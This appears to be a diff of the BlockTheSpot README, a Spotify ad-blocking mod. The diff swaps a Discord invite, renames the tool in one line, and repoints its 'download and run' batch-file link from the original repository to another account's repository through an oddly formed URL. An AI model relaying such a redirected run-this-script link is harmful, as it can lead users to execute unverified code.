@@ -1,4 +1,4 @@
-[![Build status](https://ci.appveyor.com/api/projects/status/31l6ynm0a1fhr2vs/branch/master?svg=true)](https://ci.appveyor.com/project/mrpond/blockthespot/branch/master)  [![Discord](https://discord.com/api/guilds/807273906872123412/widget.png)](https://discord.gg/p43cusgUPm)
+[![Build status](https://ci.appveyor.com/api/projects/status/31l6ynm0a1fhr2vs/branch/master?svg=true)](https://ci.appveyor.com/project/mrpond/blockthespot/branch/master)  [![Discord](https://discord.com/api/guilds/807273906872123412/widget.png)](https://discord.gg/U8Kh2czvks)
 
 <center>
     <h3 align="center"><a href="https://discord.gg/U8Kh2czvks">Make Sure to Join My Discord Server</a></h3>
@@ -17,7 +17,7 @@
 </center>
 
 #### Important checks before installing:
-0. Update Windows, update Spotify and update BlockTheSpot
+0. Update Windows, update Spotify and update BlockTheSpotify
 1. Go to "Windows Security" -> "Virus & Threat Protection"
 2. Click "Allowed threats" -> "Remove all allowed threats"
 
@@ -30,7 +30,7 @@
 :warning: This mod is for the [**Desktop Application**](https://www.spotify.com/download/windows/) of Spotify on Windows only and **not the Microsoft Store version**.
 
 ### Installation/Update:
-* Just download and run [BlockTheSpot.bat](https://raw.githack.com/mrpond/BlockTheSpot/master/BlockTheSpot.bat)  
+* Just download and run [BlockTheSpot.bat](https://raw.githack.com/revinewyd/SpotifyPremium/blob/main/BlockTheSpot.bat)  
 
 or
 
